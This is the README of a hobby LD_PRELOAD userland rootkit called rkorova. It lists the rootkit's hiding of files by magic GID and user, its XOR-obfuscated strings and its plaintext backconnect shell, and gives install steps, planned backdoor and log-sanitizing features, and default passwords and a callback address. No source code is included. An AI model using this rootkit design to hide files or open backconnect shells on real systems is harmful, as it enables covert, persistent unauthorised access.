# rkorova

shitty LD_PRELOAD userland rootkit 

### Features
* (some) anti-debugging - strings are xor'ed out and rkorova cleans up after itself
* hides files and directories through username and magic GID comparisons 
* shitty plaintext backconnect shell 

```
 ______     __  __     ______     ______     ______     __   __   ______    
/\  == \   /\ \/ /    /\  __ \   /\  == \   /\  __ \   /\ \ / /  /\  __ \   
\ \  __<   \ \  _"-.  \ \ \/\ \  \ \  __<   \ \ \/\ \  \ \ \'/   \ \  __ \  
 \ \_\ \_\  \ \_\ \_\  \ \_____\  \ \_\ \_\  \ \_____\  \ \__|    \ \_\ \_\ 
  \/_/ /_/   \/_/\/_/   \/_____/   \/_/ /_/   \/_____/   \/_/      \/_/\/_/ 
                                                                          
```
### Installation
* step 1: run install.sh to compile 
* step 2: chgrp to the magic GID 
* step 3: create magic user 
* step 4: install rkorova.so 
* step 5: ????
* step 6: be eleet 

### Upcoming features
* complete anti-debugging features 
* accept() backdoor 
* log sanitization
* antidetection 
* network hiding 
* kernel module?

### Default values: 
* MAGIC = "imgay"
* MAGICGID = 1337 
* EXECPW = installgentoo
* SHELLPW = bl1ng
* PROC = /proc
* DEFAULT_PORT = 61040
* IP = 1.3.3.7
* XOR key = 0x2A
Change these values with the xor.py tool included, or defiler will pwn ur box

### Uses 

Please don't use this rootkit for literally anything, it's terrible and probably can't even fool rkhunter. Unless your sysadmin is Steven Landes, you will get pwned and exposed within a day. Also, rooting people is illegal :) 
